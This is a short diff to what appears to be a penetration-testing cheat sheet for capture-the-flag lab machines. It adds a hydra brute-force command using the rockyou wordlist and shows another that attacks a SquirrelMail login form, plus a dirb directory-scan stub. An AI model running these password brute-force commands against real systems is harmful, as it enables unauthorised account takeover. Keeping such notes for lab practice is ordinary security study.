@@ -24,6 +24,7 @@ Only Use this after saving the request from burp suite
 
 Bruteforce command using hydra for login page
 hydra -l milesdyson -P log1.txt 10.10.229.33 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.209.75 http-get
 
 Finding hidden directories
 dirb website-link
